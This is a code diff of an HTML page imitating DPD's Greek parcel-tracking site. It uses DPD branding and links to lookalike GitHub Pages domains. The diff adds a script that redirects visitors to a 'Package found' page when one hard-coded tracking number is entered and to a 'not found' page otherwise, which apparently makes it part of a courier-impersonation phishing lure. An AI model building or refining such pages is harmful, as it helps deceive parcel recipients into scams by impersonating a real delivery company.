@@ -1,5 +1,4 @@
-
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
@@ -26,17 +25,33 @@
 <img src="images/logoDPD.png" class="imgLogoHeader">
 <div class="divHeaderTitle">Your delivery experts</div>
 <div style="clear: both;"></div>
-</div><div class="divTitle">Parcel tracking</div>
+</div>
+<div class="divTitle">Parcel tracking</div>
 <form name="formTracking" method="GET" action="" class="formTrackShipment">
 <a href="?shipmentNumber=&language=gr"><img src="images/flagGreece.png" class="flag"></a>
 <img src="images/flagUnitedKingdom.png" class="flagNotActive">
 <input type="text" id="shipmentNumber" name="shipmentNumber" class="shipmentNumber" value="">
 <input type="hidden" id="language" name="language" value="en">
 <input type="submit" class="shipmentSubmit" value="Track">
-</form><div class="divFooter">
+</form>
+<script>
+    function checkInput() {
+        var input = document.getElementById("shipmentNumber");
+        var inputValue = input.value.trim();
+
+        if (inputValue === "3456 7898 7667 88") {
+            window.location.href = "https://dpdexpressgrece.github.io/Package-found/index.html";
+        } else {
+            window.location.href = "https://dpdexpressgrece.github.io/Package-not-found/index.html";
+        }
+    }
+</script>
+<div class="divFooter">
 <a href="https://www.dpd.com" target="_blank"><img src="images/logo_group.jpg" class="imgLogoFooter"></a>
 <div class="divFooterLinks"><a href="https://dpddeutsch.github.io/dpddeutschland/Willkommen.html" target="_blank" class="aFooterCopyright">© 2023 DPD</a></div>
 <div style="clear: both;"></div>
-</div></div>
-<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="f1162881d5dbf7d4829e6bca-|49" defer=""></script></body>
+</div>
+</div>
+<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="f1162881d5dbf7d4829e6bca-|49" defer=""></script>
+</body>
 </html>
